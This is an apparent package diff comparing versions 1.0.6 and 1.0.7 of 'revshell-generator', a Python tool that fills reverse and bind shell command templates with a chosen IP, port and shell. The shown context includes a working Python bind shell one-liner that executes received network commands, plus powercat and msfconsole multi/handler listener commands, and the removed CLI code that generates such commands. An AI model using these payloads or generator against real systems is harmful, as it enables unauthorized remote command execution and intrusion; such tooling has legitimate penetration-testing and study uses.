# Comparing `tmp/revshell-generator-1.0.6.tar.gz` & `tmp/revshell-generator-1.0.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "revshell-generator-1.0.6.tar", last modified: Tue Jan  3 21:35:21 2023, max compression
+gzip compressed data, was "revshell-generator-1.0.7.tar", last modified: Sat May 13 22:59:22 2023, max compression
```

## Comparing `revshell-generator-1.0.6.tar` & `revshell-generator-1.0.7.tar`

### file list

```diff
@@ -1,18 +1,20 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-01-03 21:35:21.916873 revshell-generator-1.0.6/
--rw-r--r--   0 runner    (1001) docker     (123)     1063 2023-01-03 21:35:12.000000 revshell-generator-1.0.6/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)     5434 2023-01-03 21:35:21.916873 revshell-generator-1.0.6/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)     4295 2023-01-03 21:35:12.000000 revshell-generator-1.0.6/README.md
--rw-r--r--   0 runner    (1001) docker     (123)      120 2023-01-03 21:35:12.000000 revshell-generator-1.0.6/pyproject.toml
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-01-03 21:35:21.916873 revshell-generator-1.0.6/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     7188 2023-01-03 21:35:12.000000 revshell-generator-1.0.6/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-01-03 21:35:21.912873 revshell-generator-1.0.6/src/
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-01-03 21:35:21.912873 revshell-generator-1.0.6/src/reverseshellgenerator/
--rw-r--r--   0 runner    (1001) docker     (123)        0 2023-01-03 21:35:12.000000 revshell-generator-1.0.6/src/reverseshellgenerator/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)    49327 2023-01-03 21:35:12.000000 revshell-generator-1.0.6/src/reverseshellgenerator/generator.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-01-03 21:35:21.916873 revshell-generator-1.0.6/src/revshell_generator.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     5434 2023-01-03 21:35:21.000000 revshell-generator-1.0.6/src/revshell_generator.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      412 2023-01-03 21:35:21.000000 revshell-generator-1.0.6/src/revshell_generator.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-01-03 21:35:21.000000 revshell-generator-1.0.6/src/revshell_generator.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       76 2023-01-03 21:35:21.000000 revshell-generator-1.0.6/src/revshell_generator.egg-info/entry_points.txt
--rw-r--r--   0 runner    (1001) docker     (123)       10 2023-01-03 21:35:21.000000 revshell-generator-1.0.6/src/revshell_generator.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)       22 2023-01-03 21:35:21.000000 revshell-generator-1.0.6/src/revshell_generator.egg-info/top_level.txt
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-13 22:59:22.706616 revshell-generator-1.0.7/
+-rw-r--r--   0 runner    (1001) docker     (123)     1063 2023-05-13 22:59:13.000000 revshell-generator-1.0.7/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)     3075 2023-05-13 22:59:22.706616 revshell-generator-1.0.7/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)     1942 2023-05-13 22:59:13.000000 revshell-generator-1.0.7/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)      192 2023-05-13 22:59:13.000000 revshell-generator-1.0.7/pyproject.toml
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-13 22:59:22.706616 revshell-generator-1.0.7/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     2716 2023-05-13 22:59:13.000000 revshell-generator-1.0.7/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-13 22:59:22.702616 revshell-generator-1.0.7/src/
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-13 22:59:22.706616 revshell-generator-1.0.7/src/reverseshellgenerator/
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-13 22:59:13.000000 revshell-generator-1.0.7/src/reverseshellgenerator/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)    10004 2023-05-13 22:59:13.000000 revshell-generator-1.0.7/src/reverseshellgenerator/generator.py
+-rw-r--r--   0 runner    (1001) docker     (123)    39682 2023-05-13 22:59:13.000000 revshell-generator-1.0.7/src/reverseshellgenerator/shells_templates.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1829 2023-05-13 22:59:13.000000 revshell-generator-1.0.7/src/reverseshellgenerator/test_generator.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-13 22:59:22.706616 revshell-generator-1.0.7/src/revshell_generator.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     3075 2023-05-13 22:59:22.000000 revshell-generator-1.0.7/src/revshell_generator.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      506 2023-05-13 22:59:22.000000 revshell-generator-1.0.7/src/revshell_generator.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-13 22:59:22.000000 revshell-generator-1.0.7/src/revshell_generator.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       76 2023-05-13 22:59:22.000000 revshell-generator-1.0.7/src/revshell_generator.egg-info/entry_points.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       20 2023-05-13 22:59:22.000000 revshell-generator-1.0.7/src/revshell_generator.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       22 2023-05-13 22:59:22.000000 revshell-generator-1.0.7/src/revshell_generator.egg-info/top_level.txt
```

### Comparing `revshell-generator-1.0.6/LICENSE` & `revshell-generator-1.0.7/LICENSE`

 * *Files identical despite different names*

### Comparing `revshell-generator-1.0.6/src/reverseshellgenerator/generator.py` & `revshell-generator-1.0.7/src/reverseshellgenerator/shells_templates.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,11 +1,8 @@
 #!/usr/bin/env python3
-from cmd import Cmd
-import os
-from termcolor import colored
 
 bind_shell_commands = [
     {
         "name": "Python3 Bind",
         "command": "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
         "meta": ["bind", "mac", "linux", "windows"]
     },
@@ -437,242 +434,8 @@
         'name': 'powercat',
         'command': 'powercat -l -p {port}'
     },
     {
         'name': 'msfconsole',
         'command': 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"'
     }
-]
-
-shells = ['sh',
-          '/bin/sh',
-          'bash',
-          '/bin/bash',
-          'cmd',
-          'powershell',
-          'pwsh',
-          'ash',
-          'bsh',
-          'csh',
-          'ksh',
-          'zsh',
-          'pdksh',
-          'tcsh']
-
-from ipaddress import ip_address
-
-
-class ReverseShellGenerator(Cmd):
-    intro: str = colored(
-        "Welcome to the reverse shell generator. Type 'help' or '?' to list available commands.", 'yellow')
-    prompt: str = colored(">> ", 'yellow')
-    ip: str = None
-    port: int = None
-    shell: str = '/bin/sh'
-
-    REVERSE = 'reverse'
-    LISTENERS = 'listeners'
-    SHELLS = 'shells'
-    MSFVENOM = 'msfvenom'
-    list_actions = [REVERSE, LISTENERS, SHELLS, MSFVENOM]
-    get_actions = [REVERSE, LISTENERS, MSFVENOM]
-
-    def do_ip(self, ip: str):
-        if ip:
-            try:
-                ip_address(ip)
-            except Exception as e:
-                print(colored(f"{e}", 'red'))
-                return
-            self.ip = ip
-            print(colored(f"The IP address has been set as '{self.ip}'", 'green'))
-        else:
-            print(colored('The IP address must not be empty', 'red'))
-
-    def do_port(self, port: str):
-        if port:
-            try:
-                port = int(port)
-            except Exception:
-                print(colored('The port value must be an integer', 'red'))
-                return
-            if port <= 0 or port > 65535:
-                print(colored("The port value must in range between 0 and 65535", 'green'))
-                return
-            self.port = port
-            print(colored(f"The port has been set as '{self.port}'", 'green'))
-        else:
-            print(colored('The port value must not be empty', 'red'))
-
-    def do_shell(self, shell):
-        if shell:
-            if shell not in shells:
-                print(colored("No such shell found. Use 'list shells' to see available ones."))
-                return
-            self.shell = shell
-            print(colored(f"The shell has been set as '{self.shell}'", 'green'))
-        else:
-            print(colored('The shell name must not be empty', 'red'))
-
-    def do_list(self, item: str):
-        if not item:
-            print(colored("You must give something to list first. "
-                          "Use 'help list' to see available items.",
-                          "red"))
-            return
-        if item not in self.list_actions:
-            print(colored(f"'{item}' is not a valid item to list,"
-                          f" use one of {self.list_actions} instead", 'red'))
-        else:
-            if item == self.REVERSE:
-                for i, reverse in enumerate(reverse_shell_commands):
-                    meta = colored(f"[{' | '.join(reverse['meta'])}]", 'red')
-                    print(colored(f"{i} - {reverse['name']} {meta}", 'yellow'))
-            elif item == self.LISTENERS:
-                for i, listener in enumerate(listener_commands):
-                    print(colored(f"{i} - {listener['name']}", 'yellow'))
-            elif item == self.SHELLS:
-                for i, shell in enumerate(shells):
-                    print(colored(f"{i} - {shell}", 'yellow'))
-            elif item == self.MSFVENOM:
-                for i, venom in enumerate(msf_venom_commands):
-                    print(colored(f"{i} - {venom['name']}", 'yellow'))
-
-    def do_get(self, command: str):
-        if not self.ip:
-            print(colored("The IP address must be set before generating the command. "
-                          "Use 'ip <ip_address>' to set it.", "red"))
-            return
-        if not self.port:
-            print(colored("The port must be set before generating the command. "
-                          "Use 'port <port>' for setting it.", "red"))
-            return
-        invalid_item_message = os.linesep.join([colored('Invalid command. It needs to be as follows:', 'red'),
-                                                colored(f'get [ {" | ".join(self.list_actions)} ] [index]', 'yellow'),
-                                                '',
-                                                colored(f"E.g.: get reverse 0", 'yellow')])
-        if ' ' not in command:
-            print(invalid_item_message)
-            return
-        chunks = command.split(' ')
-        if len(chunks) != 2:
-            print(invalid_item_message)
-            return
-        else:
-            item = chunks[0]
-            if item not in self.list_actions:
-                print(invalid_item_message)
-                return
-            try:
-                index = int(chunks[1])
-            except Exception:
-                print(invalid_item_message)
-                return
-            template = self.get_command_by_index(item, index)
-            if template:
-                generated_command = self.generate_command(template)
-                print(generated_command)
-
-    def generate_command(self, template: str):
-        return template.replace("{ip}", self.ip) \
-            .replace("{port}", f"{self.port}") \
-            .replace("{shell}", self.shell)
-
-    def get_command_by_index(self, item: str, index: int):
-        no_such_index_error_message = colored(f"There is no such {item} with index {index}", 'red')
-
-        def get_item_from_list(items_list: list, attribute: str, index: int):
-            try:
-                command = items_list[index]
-                return command[attribute]
-            except IndexError:
-                print(no_such_index_error_message)
-                return
-
-        if item == self.REVERSE:
-            return get_item_from_list(reverse_shell_commands, 'command', index)
-        elif item == self.LISTENERS:
-            return get_item_from_list(listener_commands, 'command', index)
-        elif item == self.SHELLS:
-            return get_item_from_list(shells, 'command', index)
-        elif item == self.MSFVENOM:
-            return get_item_from_list(msf_venom_commands, 'command', index)
-
-    def help_ip(self):
-        print(colored(os.linesep.join(['ip [ip_address]',
-                                       'Use the given IP address as the reverse or bind shell IP address',
-                                       ]), 'yellow'))
-
-    def help_port(self):
-        print(colored(os.linesep.join(['port [port]',
-                                       'Use the given port as the reverse or bind port',
-                                       ]), 'yellow'))
-
-    def help_shell(self):
-        print(colored(os.linesep.join([f'shell [ {" | ".join(shells)} ]',
-                                       'Set the desired shell to be used in the generated reverse shell command. ',
-                                       'E.g.: shell /bin/bash',
-                                       "The '/bin/sh' shell is the default one.",
-                                       ]), 'yellow'))
-
-    def help_list(self):
-        print(colored(os.linesep.join([f'list [ {" | ".join(self.list_actions)} ]',
-                                       'List the available templates, shells or listener commands. ',
-                                       'E.g.: list shells',
-                                       ]), 'yellow'))
-
-    def help_get(self):
-        print(colored(os.linesep.join([f'get [ {" | ".join(self.get_actions)} ] [index]',
-                                       'Generate the actual command with the given options. ',
-                                       '',
-                                       "The first parameter specifies which type of the command it's going to be.",
-                                       "The [index] parameter specifies which template should be used for generating "
-                                       "the command. ",
-                                       "E.g.: get reverse 0",
-                                       '',
-                                       "Use 'list' command for getting the index."
-                                       ]), 'yellow'))
-
-
-def get_arguments():
-    from argparse import ArgumentParser
-    parser = ArgumentParser(description="Reverse Shell Generator Script")
-    parser.add_argument('--ip',
-                        dest='ip',
-                        required=False,
-                        type=str,
-                        help="Specify the IP address to put into the chosen command template. "
-                             "If omitted, the script requires you to interactively prompt it.")
-    parser.add_argument('--port',
-                        dest='port',
-                        required=False,
-                        type=int,
-                        help="Specify the port to put into the chosen command template. "
-                             "If omitted, the script requires you to interactively prompt it.")
-    parser.add_argument('--shell',
-                        dest='shell',
-                        required=False,
-                        default='/bin/sh',
-                        type=str,
-                        help="Specify which shell interpreter should be put into the generated command. "
-                             "If omitted, can be changed interactively. "
-                             f"Default is '/bin/sh'.")
-    options = parser.parse_args()
-    return options
-
-
-def main():
-    options = get_arguments()
-    generator = ReverseShellGenerator()
-    generator.ip = options.ip
-    generator.port = options.port
-    generator.shell = options.shell
-
-    generator.cmdloop()
-
-
-if __name__ == '__main__':
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(os.linesep)
-        print('Bye')
+]
```

